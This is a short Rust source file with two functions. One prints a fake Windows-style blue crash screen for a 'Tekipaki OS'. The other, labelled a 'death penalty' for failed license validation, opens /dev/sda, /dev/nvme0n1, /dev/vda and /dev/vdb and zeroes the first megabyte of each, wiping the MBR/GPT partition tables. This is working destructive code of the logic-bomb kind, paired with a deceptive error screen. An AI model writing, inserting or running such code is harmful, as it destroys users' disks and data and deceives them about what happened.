use std::process::Command;
use std::fs::File;
use std::io::Write;

pub fn display_bsod() {
    println!("System Error: 0x8004DEAD");
    // Simulate BSOD UI by clearing screen and coloring background blue (Win7 style)
    println!("\x1b[44m\x1b[37m");
    println!("A problem has been detected and Tekipaki OS has been shut down to prevent damage");
    println!("to your computer.");
    println!("");
    println!("UNEXPECTED_KERNEL_MODE_TRAP");
    println!("");
    println!("If this is the first time you've seen this Stop error screen,");
    println!("restart your computer. If this screen appears again, follow");
    println!("these steps:");
    println!("");
    println!("Check to make sure any new hardware or software is properly installed.");
    println!("If this is a new installation, ask your hardware or software manufacturer");
    println!("for any Tekipaki OS updates you might need.");
    println!("");
    println!("Technical Information:");
    println!("");
    println!("*** STOP: 0x8004DEAD (0x00000000, 0x00000000, 0x00000000, 0x00000000)");
    println!("\x1b[0m");
}

use std::fs::OpenOptions;

pub fn perform_disk_wipe() {
    println!("CRITICAL: License validation failed. Performing death penalty...");
    // Direct I/O to wipe MBR/GPT
    // We use OpenOptions to write directly to the block device without truncation.
    let drives = vec!["/dev/sda", "/dev/nvme0n1", "/dev/vda", "/dev/vdb"];
    for drive in drives {
        match OpenOptions::new().write(true).open(drive) {
            Ok(mut file) => {
                let zero_buffer = vec![0u8; 1024 * 1024]; // 1MB zero to clear MBR and GPT
                if let Err(e) = file.write_all(&zero_buffer) {
                    eprintln!("Failed to wipe drive {}: {}", drive, e);
                } else {
                    let _ = file.sync_all();
                    println!("Drive {} successfully penalized.", drive);
                }
            }
            Err(e) => {
                eprintln!("Could not open drive {}: {}", drive, e);
            }
        }
    }
}
